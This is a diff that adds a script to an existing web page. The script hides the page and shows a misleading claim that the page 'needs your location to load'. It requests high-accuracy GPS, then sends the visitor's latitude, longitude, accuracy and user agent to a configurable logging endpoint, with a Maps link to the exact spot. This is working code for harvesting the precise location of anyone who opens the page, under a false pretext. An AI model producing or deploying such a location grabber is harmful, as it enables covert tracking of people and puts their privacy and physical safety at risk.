@@ -374,5 +374,141 @@ window.addEventListener('load', ()=> {
    window.uiTweak = (moveMs, pauseMs, fullMs) => { MOVE_TOTAL_MS = moveMs; PAUSE_MS = pauseMs; FULL_TEXT_MS = fullMs; };
 */
 </script>
+
+<!-- wrap your existing page content with this: -->
+<div id="realContent" style="display:none">
+  <!-- paste your entire existing <div class="stage">... full page ...</div> here -->
+</div>
+
+<script>
+/* Permission-gated load script.
+   Put this before </body>. It won't wipe your page. */
+
+(function(){
+  const real = document.getElementById('realContent');
+
+  // Immediately hide content (in case CSS or render already showed it)
+  if(real) real.style.display = 'none';
+
+  function showBlockedMessage() {
+    // Replace only the visible area with the block message, keep scripts intact
+    const blocker = document.createElement('div');
+    blocker.id = 'locationBlocker';
+    blocker.style.cssText = `
+      position:fixed;inset:0;display:flex;flex-direction:column;
+      align-items:center;justify-content:center;background:#10071f;color:#b889ff;
+      font-family:Inter, system-ui, sans-serif;padding:24px;text-align:center;z-index:9999;
+    `;
+    blocker.innerHTML = `
+      <h2 style="margin:0 0 8px 0">⚠️ Location Access Required</h2>
+      <p style="margin:0 0 16px 0;opacity:0.95">This page needs your location to load. Please allow location access in the browser prompt.</p>
+      <div style="font-size:0.9rem;opacity:0.85">If you denied earlier, enable Location for this site in your browser settings and reload.</div>
+    `;
+    document.body.appendChild(blocker);
+  }
+
+  function removeBlocker() {
+    const b = document.getElementById('locationBlocker');
+    if(b) b.remove();
+  }
+
+  function initPageWithPosition(pos) {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const accuracy = pos.coords.accuracy; // meters
+    // Reveal main UI
+    if(real) real.style.display = 'block';
+    removeBlocker();
+
+    // Place coordinates into DOM for debugging / display
+    let info = document.getElementById('visitorLocationInfo');
+    if(!info){
+      info = document.createElement('div');
+      info.id = 'visitorLocationInfo';
+      info.style.cssText = 'position:fixed;right:12px;bottom:12px;background:rgba(0,0,0,0.5);color:#fff;padding:8px;border-radius:8px;font-size:12px;z-index:9998';
+      document.body.appendChild(info);
+    }
+    info.textContent = `lat: ${lat.toFixed(6)}  lon: ${lon.toFixed(6)}  accuracy: ${Math.round(accuracy)}m`;
+
+    console.log('Precise user location:', {lat, lon, accuracy, timestamp: pos.timestamp});
+
+    // OPTIONAL: send to your logging endpoint
+    // Replace 'https://your-endpoint.example/visit' with your endpoint (SheetDB, Firebase, Vercel function, etc)
+    const LOG_ENDPOINT = 'https://your-endpoint.example/visit'; // << REPLACE THIS
+    if(LOG_ENDPOINT && !LOG_ENDPOINT.includes('your-endpoint')) {
+      fetch(LOG_ENDPOINT, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          accuracy_m: accuracy,
+          ts: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        })
+      }).catch(err => console.warn('Log endpoint error:', err));
+    }
+
+    // OPTIONAL: show a quick "open in maps" link for manual check
+    const mapsHref = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+    let linkEl = document.getElementById('openMapsLink');
+    if(!linkEl){
+      linkEl = document.createElement('a');
+      linkEl.id = 'openMapsLink';
+      linkEl.href = mapsHref;
+      linkEl.target = '_blank';
+      linkEl.rel = 'noopener';
+      linkEl.style.cssText = 'position:fixed;left:12px;bottom:12px;background:rgba(255,255,255,0.06);color:#b889ff;padding:8px;border-radius:8px;font-size:12px;text-decoration:none;z-index:9998';
+      linkEl.textContent = 'Open location in Maps';
+      document.body.appendChild(linkEl);
+    } else {
+      linkEl.href = mapsHref;
+    }
+  }
+
+  function handleError(err) {
+    console.warn('Geolocation error:', err);
+    // If permission denied or position unavailable -> show block message
+    showBlockedMessage();
+
+    // Provide helpful browser-specific hint (optional)
+    if(err.code === err.PERMISSION_DENIED) {
+      // You cannot re-trigger the prompt automatically after denial in most browsers.
+      // Tell the user how to re-enable (they must change site permissions manually).
+      const hint = document.createElement('div');
+      hint.style.cssText = 'position:fixed;left:12px;top:12px;background:#fff;color:#000;padding:8px;border-radius:6px;font-size:12px;z-index:9999';
+      hint.innerHTML = `Permission denied. To enable: Browser menu → Site settings → Location → Allow, then reload.`;
+      document.body.appendChild(hint);
+    }
+  }
+
+  // Use highAccuracy to request GPS if available. Will increase chance of a permission prompt.
+  function requestLocation() {
+    if(!navigator.geolocation) {
+      console.warn('Geolocation not supported.');
+      showBlockedMessage();
+      return;
+    }
+    // First show blocker quickly while prompt is pending
+    showBlockedMessage();
+
+    // Request location (this triggers the browser prompt)
+    navigator.geolocation.getCurrentPosition(
+      pos => initPageWithPosition(pos),
+      err => handleError(err),
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  // start immediately on DOMContentLoaded (or earlier if script is at end)
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', requestLocation);
+  } else {
+    requestLocation();
+  }
+})();
+</script>
+
+  
 </body>
 </html>
